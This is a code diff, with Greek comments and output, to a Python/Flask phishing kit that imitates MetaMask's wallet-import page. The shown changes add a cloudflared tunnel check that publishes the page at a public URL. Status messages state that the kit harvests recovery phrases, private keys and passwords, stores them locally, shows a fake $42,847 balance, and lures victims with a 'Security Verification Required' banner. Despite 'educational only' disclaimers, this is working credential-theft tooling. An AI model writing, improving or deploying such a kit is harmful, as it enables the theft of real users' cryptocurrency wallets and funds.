@@ -1760,7 +1748,7 @@ def import_wallet():
                     }, index * 200);
                 });
                 
-                // Animate connected assets
+                // Κινούμενη εμφάνιση συνδεδεμένων περιουσιακών στοιχείων
                 const connectedAssets = document.querySelectorAll('.asset-connected');
                 connectedAssets.forEach((asset, index) => {
                     asset.style.opacity = '0';
@@ -1771,7 +1759,7 @@ def import_wallet():
                 });
             }, 500);
             
-            // Handle mobile viewport height
+            // Χειρισμός ύψους viewport σε κινητά
             function setViewportHeight() {
                 let vh = window.innerHeight * 0.01;
                 document.documentElement.style.setProperty('--vh', `${vh}px`);
@@ -1785,32 +1773,51 @@ def import_wallet():
     </html>
     ''')
 
+# ====== Σήραγγα Cloudflared ======
+def check_cloudflared():
+    """Ελέγχει αν το cloudflared είναι εγκατεστημένο και προσβάσιμο."""
+    try:
+        subprocess.run(["cloudflared", "--version"], capture_output=True, check=True)
+        return True
+    except (subprocess.SubprocessError, FileNotFoundError):
+        return False
+
 def run_cloudflared_tunnel(local_url):
+    """Εκκινεί τη σήραγγα cloudflared και εξάγει τη δημόσια διεύθυνση URL."""
+    if not check_cloudflared():
+        print("⚠️  Το cloudflared δεν βρέθηκε. Παρακαλώ εγκαταστήστε το από https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation")
+        print("🔗 Μόνο τοπική διεύθυνση URL: http://127.0.0.1:5015")
+        return None
+
     cmd = ["cloudflared", "tunnel", "--url", local_url]
     process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-    
+
+    # Προσπάθεια σύλληψης της διεύθυνσης URL της σήραγγας
+    url_pattern = re.compile(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com')
     for line in process.stdout:
-        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
+        match = url_pattern.search(line)
         if match:
             tunnel_url = match.group(0)
-            print(f"💰 Σύνδεσμος MetaMask: {tunnel_url}")
-            print(f"🔐 Συλλογή: Φράσεις Ανάκτησης, Ιδιωτικά Κλειδιά & Κωδικοί")
+            print(f"💰 MetaMask Δημόσιος Σύνδεσμος: {tunnel_url}")
+            print(f"🔐 Συλλογή: Φράσεων Ανάκτησης, Ιδιωτικών Κλειδιών & Κωδικών Πρόσβασης")
             print(f"💾 Τοποθεσία αποθήκευσης: {BASE_FOLDER}")
-            print(f"💰 Εμφάνιση: $42,847 πορτοφόλι (12.84 ETH)")
+            print(f"💰 Εμφάνιση: Χαρτοφυλάκιο $42,847 (12.84 ETH)")
             print("📱 Βελτιστοποιημένο για κινητές συσκευές")
-            print("🎯 Πραγματικό λογότυπο MetaMask και εικόνες")
-            print("⚠️  ΠΡΟΣΟΧΗ: Μόνο για εκπαιδευτικούς σκοπούς!")
-            print("⚠️  ΠΟΤΕ μην εισάγετε πραγματικές φράσεις ανάκτησης ή ιδιωτικά κλειδιά!")
-            print("⚠️  Η MetaMask είναι ο #1 στόχος για κρυπτογραφική phishing!")
-            print("⚠️  Φράση ανάκτησης = Πλήρης έλεγχος πορτοφολιού!")
+            print("🎯 Πραγματικό λογότυπο και εικονίδια MetaMask")
+            print("⚠️  ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Μόνο για εκπαιδευτικούς σκοπούς!")
+            print("⚠️  ΜΗΝ εισάγετε ΠΟΤΕ πραγματικές φράσεις ανάκτησης ή ιδιωτικά κλειδιά!")
+            print("⚠️  Η MetaMask είναι ο νούμερο 1 στόχος για phishing κρυπτονομισμάτων!")
+            print("⚠️  Φράση ανάκτησης = Πλήρης έλεγχος του πορτοφολιού!")
             print("⚠️  Ιδιωτικό κλειδί = Άμεση πρόσβαση σε όλα τα κεφάλαια!")
             print("-" * 50)
             sys.stdout.flush()
             break
-    
+
     return process
 
+# ====== Κύρια ======
 if __name__ == '__main__':
+    # Προσωρινή καταστολή της εξόδου του Flask
     sys_stdout = sys.stdout
     sys_stderr = sys.stderr
     sys.stdout = DummyFile()
@@ -1822,24 +1829,35 @@ if __name__ == '__main__':
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
 
-    time.sleep(2)
+    time.sleep(2)  # Δίνουμε λίγο χρόνο στο Flask να ξεκινήσει
     sys.stdout = sys_stdout
     sys.stderr = sys_stderr
 
-    print("🚀 Έναρξη Σελίδας Εισαγωγής Πορτοφολιού MetaMask...")
+    print("🚀 Εκκίνηση Σελίδας Εισαγωγής Πορτοφολιού MetaMask...")
     print("📱 Θύρα: 5015")
-    print("💾 Τοποθεσία αποθήκευσης: ~/storage/downloads/MetaMask/")
-    print("💰 Εμφάνιση: $42,847 Πορτοφόλι (12.84 ETH, WBTC, USDC, UNI)")
-    print("🔐 Συλλογή: Φράσεις Ανάκτησης Η΄ Ιδιωτικά Κλειδιά + Κωδικοί")
+    print(f"💾 Τοποθεσία αποθήκευσης: {BASE_FOLDER}")
+    print("💰 Εμφάνιση: Χαρτοφυλάκιο $42.847 (12,84 ETH, WBTC, USDC, UNI)")
+    print("🔐 Συλλογή: Φράσεων Ανάκτησης Ή Ιδιωτικών Κλειδιών + Κωδικών")
     print("🎯 Στόχος: Χρήστες MetaMask που χρειάζονται 'εισαγωγή πορτοφολιού'")
-    print("🎯 Στρατηγική: Πανό 'Απαιτείται Επαλήθευση Ασφαλείας'")
-    print("📱 Βελτιστοποιημένο για κινητά και υπολογιστές")
-    print("🦊 Χρήση πραγματικού λογότυπου MetaMask και κρυπτογραφικών εικόνων")
-    print("⚠️  ΠΡΟΣΟΧΗ: Η phishing της MetaMask κλέβει εκατομμύρια κάθε μήνα!")
+    print("🎯 Στρατηγική: Banner 'Απαιτείται Επαλήθευση Ασφαλείας'")
+    print("📱 Βελτιστοποιημένο για κινητά και desktop")
+    print("🦊 Χρήση πραγματικού λογότυπου MetaMask και κρυπτο-εικονιδίων")
+    print("⚠️  ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Το phishing MetaMask κλέβει εκατομμύρια μηνιαίως!")
     print("⚠️  Μόλις κλαπεί η φράση ανάκτησης, ΟΛΑ τα κρυπτονομίσματα ΧΑΝΟΝΤΑΙ!")
-    print("⏳ Αναμονή για σήραγγα cloudflared...")
-    
+    print("⏳ Αναμονή για τη σήραγγα cloudflared...")
+
+    # Εκκίνηση σήραγγας cloudflared (ή εναλλακτικά τοπική πρόσβαση)
     cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5015")
+    if cloudflared_process is None:
+        print("\n🔗 Πρόσβαση στη σελίδα τοπικά στη διεύθυνση http://127.0.0.1:5015")
+        print("Πατήστε Ctrl+C για διακοπή.\n")
+        # Διατήρηση του κύριου νήματος χωρίς cloudflared
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print("\n👋 Ο διακομιστής σταμάτησε")
+            sys.exit(0)
 
     try:
         cloudflared_process.wait()
